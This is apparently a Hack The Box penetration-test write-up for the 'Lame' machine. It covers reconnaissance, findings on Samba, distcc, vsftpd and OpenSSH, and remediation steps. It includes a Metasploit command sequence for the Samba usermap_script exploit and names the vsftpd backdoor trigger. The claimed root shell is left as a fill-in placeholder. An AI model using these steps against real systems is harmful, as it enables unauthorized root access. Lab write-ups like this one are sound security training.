# Lame — Penetration Test Write-up

**Target:** Lame (Hack The Box) · **OS:** Linux · **Difficulty:** Easy
**IP:** 10.129.101.112 · **Date:** 2026-11-24 · **Author:** Giovanni Pio Ianniello

---

## Executive Summary

The target host exposed several outdated and vulnerable network services. Most
critically, the Samba service (v3.0.20) was affected by a command-injection
vulnerability (**CVE-2007-2447**) that allowed an **unauthenticated** attacker to
execute arbitrary commands **as root**, resulting in full compromise of the system
without any valid credentials.

Additional high-risk findings were identified (a backdoored FTP version and a
remotely exploitable distcc daemon), confirming a broader lack of patch management
on the host. Exploitation was confirmed on the Samba service; the others are
reported as exposed, high-risk attack surface.

---

## Methodology & Tools

Standard network-pentest workflow: enumeration → vulnerability identification →
exploitation → proof. Tools: `nmap` (service/version detection), `searchsploit`,
`msfconsole` (Metasploit).

---

## Findings Summary

| # | Finding | Service / Port | CVSS (source) | Severity | Status |
|---|---|---|---|---|---|
| 1 | Samba `usermap_script` command injection (CVE-2007-2447) | Samba 3.0.20 — 139/445 | v2 **6.0** (NVD vector) · vendor v3 ~8.8 | Medium on paper — **Critical in practice (unauth root RCE)** | ✅ Exploited → root |
| 2 | distcc daemon command execution (CVE-2004-2687) | distccd v1 4.2.4 — 3632 | v2 **9.3** · v3 **9.8** (NVD) | High / Critical | Exposed, not exploited |
| 3 | Backdoored vsftpd version (CVE-2011-2523) | vsftpd 2.3.4 — 21 | v2 **10.0** · v3 **9.8** (NVD) | Critical (by version) | Vulnerable version present; backdoor not triggered on this host |
| 4 | Outdated OpenSSH | OpenSSH 4.7p1 — 22 | — | Low / Informational | Outdated software, no exploit used |

---

## Reconnaissance

```bash
sudo nmap -p- -sV -sC --min-rate 1000 10.129.101.112
```

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 2.3.4 |
| 22/tcp | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 139/tcp | netbios-ssn | Samba smbd 3.X–4.X |
| 445/tcp | netbios-ssn | Samba smbd 3.0.20-Debian |
| 3632/tcp | distccd | distccd v1 ((GNU) 4.2.4) |

Four services, all running outdated software — a classic "known-CVE" attack surface.

---

## Finding 1 — Samba `usermap_script` Command Injection (CVE-2007-2447) ✅ EXPLOITED

**Severity:** CVSS v2 **6.0** (AV:N/AC:M/Au:S/C:P/I:P/A:P — source: NVD-associated vector).
NVD has not published an official base score; vendor v3 estimates reach ~8.8 (Rapid7).
> **Risk note:** The CVSS score understates real-world impact. The `Au:S` metric
> implies authentication is required, but this vulnerability is exploitable
> **unauthenticated**, and `smbd` runs as **root**, so successful exploitation
> yields a **root shell with no credentials** — effectively critical.

**Description.** Samba 3.0.0–3.0.25rc3, when the `username map script` option is
enabled in `smb.conf`, passes the username to a shell without sanitisation. Shell
metacharacters in the username are executed as commands by the Samba process (root).

**Exploitation (Metasploit).**
```
msfconsole
search Samba 3.0.20
use exploit/multi/samba/usermap_script 
set RHOSTS 10.129.101.112
set LHOST 10.10.17.12
run
```
Result: a shell as **root** (confirm/replace with your exact session output).

**Remediation.** Upgrade Samba to ≥ 3.0.25. Remove or strictly sanitise the
`username map script` directive. Restrict SMB exposure to trusted networks.

---

## Finding 2 — distcc Daemon Command Execution (CVE-2004-2687)

**Severity:** CVSS v2 **9.3** / v3 **9.8** (NVD).

**Description.** `distccd` 2.x, when not restricted to trusted hosts, lets remote
attackers execute arbitrary commands via crafted compilation jobs. Note: the
resulting shell runs as the low-privileged **`daemon`** user (local privilege
escalation would then be required to reach root).

**Remediation.** Disable distcc if not needed, or bind it to localhost / restrict
it to authenticated, trusted hosts. Never expose it to untrusted networks.

---

## Finding 3 — Backdoored vsftpd Version (CVE-2011-2523)

**Severity:** CVSS v2 **10.0** / v3 **9.8** (NVD).

**Description.** vsftpd 2.3.4 distributed between 2011-06-30 and 2011-07-03 shipped
with a malicious backdoor that opens a root shell on port 6200/tcp when a `:)`
smiley is sent in the username. The running version (2.3.4) matches the affected
version.

> **Status note:** The backdoor did not appear active on this host (port 6200 did
> not open on trigger). This is a good example of **"vulnerable version present" ≠
> "confirmed exploitable"** — reported as a critical version-level finding pending
> confirmation, not as a successful exploit.

**Remediation.** Replace vsftpd 2.3.4 with a clean, current release from a verified
source; validate package integrity.

---

## Finding 4 — Outdated OpenSSH

**Severity:** Low / Informational.

**Description.** OpenSSH 4.7p1 (2007) is years out of date and should be updated as
part of routine patch management. No specific vulnerability was exploited here.

**Remediation.** Update OpenSSH to a current supported release.

---

## Remediation Summary

1. **Patch management** — every exposed service runs end-of-life software; establish
   a regular update process.
2. **Reduce attack surface** — remove or firewall services that need not be
   network-exposed (distcc especially).
3. **Network segmentation** — restrict SMB/FTP/distcc to trusted segments.
4. **Integrity & configuration** — verify package integrity (vsftpd), sanitise
   Samba's `username map script`.

---

## Lessons Learned

- The **#1 easy-box pattern**: fingerprint the service + version → find the public
  exploit. Lame had four outdated services; recognising the versions was the whole game.
- **CVSS is a guide, not gospel.** The Samba RCE scores only 6.0 yet gives
  unauthenticated root — always pair the score with the real-world impact.
- **"Version present" vs "exploit confirmed"** are different claims in a report
  (vsftpd). Professional honesty > padding the findings.
- A single service can offer multiple paths (Samba as root vs distcc as `daemon`);
  choosing the one that lands root directly was the efficient call.
